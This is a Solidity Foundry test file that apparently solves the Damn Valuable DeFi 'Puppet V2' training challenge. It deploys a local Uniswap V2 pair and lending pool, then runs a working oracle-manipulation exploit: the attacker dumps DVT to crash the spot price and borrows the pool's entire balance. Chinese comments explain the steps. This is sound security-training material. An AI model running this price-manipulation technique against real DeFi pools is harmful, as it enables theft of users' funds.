// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );
        // 也就是说在该池子中每个dvt初始价格是0.1 ether

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertGt(uniswapV2Pair.balanceOf(deployer), 0); // 初始流动性,(amount of tokenA * amount of  tokenB)^0.5

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        // 1个dvt等价于0.1 ether, 但是需要存3倍的eth
        // 因此应该存储0.3 ether的eth

        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300_000 ether
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    // 这仍然是一个操纵预言机的攻击, 原因是puppet合约并未正确使用v2提供的时间加权预言机
    // 向uniswap池中倾销dvt, 拉低价格, 然后用一部分eth向puppet池借贷出更多的dvt,然后继续向uniswap池倾销这些dvt继续拉低价格
    // 然后用ETH继续借贷dvt并倾销. 重复上述过程即可掏空池子
    function testExploitPUPPET2() public {
        /** EXPLOIT START **/
        // weth dvt
        uint256 _a=dvt.balanceOf(attacker);
        console.log("before swap attacker has dvt:",_a/1e18);
        console.log("before swap attacker has ether:",attacker.balance/1e18);
        console.log("befor swap attacker has weth:",weth.balanceOf(attacker)/1e18);
        
        address[] memory path=new address[](2);
        path[0]=address(dvt);
        path[1]=address(weth);
        vm.startPrank(attacker);
        dvt.approve(address(uniswapV2Router),ATTACKER_INITIAL_TOKEN_BALANCE);
        
        uniswapV2Router.swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0 ether,
            path,
            attacker,
            DEADLINE
        );
        vm.stopPrank();

        uint256 _b=dvt.balanceOf(attacker);
        console.log("after swap attacker has dvt:",_b/1e18);
        console.log("after swap attacker has ether:",attacker.balance/1e18);
        console.log("after swap attacker has weth:",weth.balanceOf(attacker)/1e18);
        

        // 检查掏空puppet2需要多少weth
        uint256 wethNeeded = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)/1e18;
        console.log("empty ppt2 need weth: ",wethNeeded);

        vm.startPrank(attacker);
        // eth换成weth
        weth.deposit{value:attacker.balance}();
        console.log("weth of attacker",weth.balanceOf(attacker)/1e18);

        weth.approve(address(puppetV2Pool),POOL_INITIAL_TOKEN_BALANCE);
        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
    }
}
